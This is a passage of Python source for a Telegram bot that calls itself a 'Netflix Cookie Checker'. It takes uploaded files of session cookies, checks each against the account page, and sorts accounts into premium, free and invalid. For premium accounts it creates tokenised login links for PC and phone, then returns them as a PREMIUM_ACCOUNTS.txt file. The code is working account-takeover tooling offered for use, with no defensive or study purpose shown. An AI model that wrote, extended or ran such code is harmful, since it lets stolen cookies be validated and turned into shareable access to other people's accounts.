                            resp, code, info = get_account_page(sess, None, 15)
                            if code == 200 and info and info.get("countryOfSignup"):
                                is_sub = is_subscribed_account(info)
                                if is_sub:
                                    nftoken = None
                                    if get_nftoken_mode(config) != "false":
                                        nftoken, _ = create_nftoken(cookies, 1)
                                    if mode == 'tokenonly':
                                        email = info.get("email", "Unknown")
                                        res = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login: https://netflix.com/?nftoken={nftoken['token']}\nPhone Login: https://netflix.com/unsupported?nftoken={nftoken['token']}"
                                    else:
                                        res = format_result_beautiful(info, is_sub, bundles[0].get("netscape_text", ""), cf, nftoken, config)
                                    premium_accounts.append(res)
                                    premium_accounts.append("\n" + "="*65 + "\n")
                                    stats['valid'] += 1
                                else:
                                    free_count += 1
                                    stats['free'] += 1
                            else:
                                invalid_count += 1
                                stats['failed'] += 1
                        else:
                            invalid_count += 1
                            stats['failed'] += 1
                    else:
                        invalid_count += 1
                        stats['failed'] += 1
                    
                    stats['total'] += 1
                    processed += 1
                    
                except Exception as e:
                    invalid_count += 1
                    processed += 1
                    print(f"Error: {e}")
        
        if not user_tasks[uid].get('cancel', False):
            elapsed = time.time() - start
            pc = len([r for r in premium_accounts if r.startswith(("=", "STATUS:", "Account:"))])
            spd = total_files / elapsed if elapsed > 0 else 0
            
            final = f"""
✅ Processing Complete

Final Statistics:
----------------------------------------------------
Total Files: {total_files}

Valid Accounts: {pc}
Premium Accounts: {pc}
Free Accounts: {free_count}
Invalid Accounts: {invalid_count}

Time Taken: {elapsed:.2f} seconds
Speed: {spd:.2f} accounts/second
----------------------------------------------------
"""
            await msg.delete()
            await update.message.reply_text(final)
            if premium_accounts:
                all_res = "".join(premium_accounts)
                buf = BytesIO()
                buf.write(all_res.encode('utf-8'))
                buf.seek(0)
                await update.message.reply_document(document=buf, filename="PREMIUM_ACCOUNTS.txt", caption=f"📄 {pc} Valid Premium Accounts Found")
            else:
                await update.message.reply_text("⚠️ No premium accounts found")
        else:
            await msg.edit_text("⏹️ Task was cancelled")
            
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:200]}")
    finally:
        user_tasks[uid]['active'] = False

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fname = update.message.document.file_name.lower()
    if fname.endswith('.zip'):
        await handle_zip_file(update, context)
    elif fname.endswith('.txt') or fname.endswith('.json'):
        await handle_single_file(update, context)
    else:
        await update.message.reply_text("❌ Send .txt, .json, or .zip files")

async def set_commands(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("tokenonly", "Token only mode"),
        BotCommand("fullinfo", "Full details mode"),
        BotCommand("cancel", "Stop task"),
    ])


# ==================== MAIN ====================

def main():
    create_base_folders()
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    print("Bot is starting...")
    print("="*50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
    app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    import asyncio
    try:
        asyncio.get_event_loop().run_until_complete(set_commands(app))
    except:
        pass
    
    print("Bot is ready! Send /start on Telegram")
    print("Press Ctrl+C to stop\n")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped")
